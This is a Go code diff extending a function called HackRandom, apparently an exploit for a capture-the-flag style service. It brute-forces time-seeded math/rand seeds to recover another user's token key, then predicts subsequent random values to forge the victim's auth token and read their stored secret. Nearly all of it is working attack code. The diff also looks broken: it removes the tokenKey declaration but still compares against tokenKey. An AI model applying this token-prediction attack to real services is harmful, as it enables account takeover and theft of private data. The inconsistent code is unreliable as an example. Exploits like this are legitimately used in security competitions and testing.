@@ -96,19 +96,34 @@ func HackRandom(addr string) error {
 		log.Error(err)
 		return err
 	}
-	tokenKey, _, err := CreateUser(endpoints.GetWebUrl())
+	victimKey, victimToken, err := CreateUser(endpoints.GetWebUrl())
+	client := api.NewClient(endpoints.GetCPUrl(), victimKey, victimToken)
+	err = client.SetUserDescription(victimKey, "secret")
+	if err != nil {
+		return err
+	}
 
 	now := time.Now()
 	for i := time.Now().Add(-120 * time.Minute); !i.After(now); i = i.Add(time.Second) {
 		//fmt.Println(i)
 		rand.Seed(i.Unix())
 		for i := 0; i < 10000; i++ {
-			//gtoken := make([]byte, 8)
-			//binary.LittleEndian.PutUint64(token, rand.Uint64())
 			gtokenKey := make([]byte, 8)
 			binary.LittleEndian.PutUint64(gtokenKey, rand.Uint64())
 			if hex.EncodeToString(gtokenKey) == tokenKey {
 				log.Info("Found!")
+
+				for true {
+					token := make([]byte, 8)
+					binary.LittleEndian.PutUint64(token, rand.Uint64())
+					aclient := api.NewClient(endpoints.GetCPUrl(), victimKey, hex.EncodeToString(token))
+					user, err := aclient.GetUser(victimKey)
+					if err == nil {
+						log.Info("Get secret :" + user.Description)
+						return nil
+					}
+				}
+
 				return nil
 			}
 		}
